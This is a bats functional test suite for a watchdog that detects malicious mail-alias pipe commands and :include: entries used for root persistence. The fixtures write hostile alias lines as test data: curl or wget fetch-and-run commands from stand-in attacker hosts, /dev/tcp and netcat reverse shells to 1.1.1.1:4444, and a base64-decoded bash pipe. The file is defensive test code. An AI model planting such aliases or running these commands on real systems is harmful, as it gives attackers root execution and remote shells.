#!/usr/bin/env bats
# L2 bats functional tests for the aliases-watchdog scan script.
#
# A mail alias `name: |command` makes the MTA run that command on delivery
# to the alias (the classic Unix mail-alias exec vector, T1546.004); a
# `name: :include:/path` reads further targets from another file. A pipe
# command under a writable root (/tmp /var/tmp /dev/shm /home) or carrying
# an injection pattern, a :include: of a writable file, or a
# world-writable/non-root aliases file, is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the aliases
# file in a tmp sandbox via SELFDEF_ALIASES_FILES.
#
# Run with: bats packaging/test/L2-aliases-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd/aliases-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    ALIASES="${TMP}/aliases"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ALIASES_PROFILE="${PROFILE:-report}" \
    SELFDEF_ALIASES_BASELINE="${BASELINE}" \
    SELFDEF_ALIASES_FILES="${ALIASES_F:-$ALIASES}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# A benign aliases posture: a mailman pipe under /usr + an :include: of a
# trusted file + a plain redirect.
seed_benign() {
    printf 'mailman: |/usr/lib/mailman/mail/mailman post mailman\nstaff: :include:/etc/mail/staff-list\npostmaster: root\n' > "${ALIASES}"
}

# ============================================================
# ok tier
# ============================================================

@test "no aliases file → ok / no_aliases" {
    ALIASES_F="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_aliases"'
    cap | grep -q '"severity":"ok"'
}

@test "benign pipe + include, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged aliases on second run → ok / aliases_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"aliases_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a pipe command under a writable root → alert / aliases_suspicious" {
    seed_benign
    run_wd                                   # benign baseline
    printf 'evil: |/tmp/.x\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"aliases_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a :include: of a writable file → alert" {
    seed_benign
    run_wd
    printf 'team: :include:/dev/shm/list\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "an injection pattern in a pipe command → alert" {
    seed_benign
    run_wd
    printf 'evil: |curl http://evil/p|sh\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable aliases file → alert" {
    seed_benign
    run_wd
    chmod 0666 "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign pipe change → warn / aliases_changed" {
    seed_benign
    run_wd
    printf 'mailman: |/usr/lib/mailman/mail/mailman post lists\nstaff: :include:/etc/mail/staff-list\npostmaster: root\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"aliases_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr-rooted pipe + trusted :include: is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# fail-loud + enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious pipe" {
    seed_benign
    run_wd
    printf 'evil: |/tmp/.x\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — aliases inventory enumerates mail-delivery-trigger root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern in pipe): /dev/tcp reverse shell → alert" {
    seed_benign
    run_wd
    printf 'evil: |bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in pipe): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf 'evil: |wget -qO- http://attacker/p | sh\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in pipe): obfuscation → alert" {
    seed_benign
    run_wd
    printf 'evil: |echo YmFzaCAtaQ== | base64 -d | bash\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (pipe under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf 'evil: |/var/tmp/.attacker\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (:include: of a /tmp file → alert): include-axis writable-root expansion" {
    seed_benign
    run_wd
    printf 'team: :include:/tmp/.attacker-list\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (:include: of a /var/tmp file → alert): include-axis writable-root expansion" {
    seed_benign
    run_wd
    printf 'team: :include:/var/tmp/.attacker-list\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-aliases -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): aliases-watchdog does NOT refresh baseline on suspicious-pipe detection — alert STAYS until operator updates" {
    # T1546.004 mail-delivery-triggered root-exec persistence — alert
    # MUST persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'evil: |/tmp/.x\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"aliases_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious pipe NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailman: |/usr/lib/mailman/mail/mailman post mailman\nstaff: :include:/etc/mail/staff-list\npostmaster: root\n# evil: |/tmp/.example-attacker\n' > "${ALIASES}"
    run_wd
    ! cap | grep -q '"event":"aliases_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: /etc/aliases + /etc/mail/aliases axes — suspicious in EITHER → alert)" {
    ALIASES2="${TMP}/mail-aliases"
    seed_benign
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ALIASES_PROFILE="report" \
    SELFDEF_ALIASES_BASELINE="${BASELINE}" \
    SELFDEF_ALIASES_FILES="${ALIASES} ${ALIASES2}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |/tmp/.evil\n' > "${ALIASES2}"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ALIASES_PROFILE="report" \
    SELFDEF_ALIASES_BASELINE="${BASELINE}" \
    SELFDEF_ALIASES_FILES="${ALIASES} ${ALIASES2}" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in pipe)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |curl -s http://attacker.com/p | bash\n' > "${ALIASES}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in aliases pipe: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on the
    # mail-delivery-triggered root-exec persistence surface
    # (T1546 — MTA delivers mail to alias pipe-target by exec'ing
    # the command AS ROOT on every matching message; attacker
    # sends self-addressed mail to trigger planted nc).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |nc -e /bin/sh 1.1.1.1 4444\n' > "${ALIASES}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
